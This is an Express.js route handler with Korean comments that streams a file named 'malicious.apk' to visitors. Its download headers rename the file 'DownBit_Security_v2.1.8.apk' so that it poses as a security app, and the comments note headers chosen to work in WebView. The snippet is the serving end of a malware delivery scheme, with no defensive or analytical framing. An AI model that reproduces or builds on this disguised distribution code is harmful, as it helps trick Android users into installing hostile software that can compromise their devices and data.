app.get('/download-apk', (req, res) => {
    const timestamp = new Date().toISOString();
    console.log(`📱 [${timestamp}] APK 다운로드 시도`);
    
    const apkPath = path.join(__dirname, 'malicious.apk');
    if (fs.existsSync(apkPath)) {
        // WebView 호환 헤더 설정
        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
        res.setHeader('Content-Disposition', 'attachment; filename="DownBit_Security_v2.1.8.apk"');
        res.setHeader('Content-Length', fs.statSync(apkPath).size);
        
        // 파일 스트림으로 전송
        const fileStream = fs.createReadStream(apkPath);
        fileStream.pipe(res);
    } else {
        res.status(404).send('APK 파일을 찾을 수 없습니다.');
    }
});
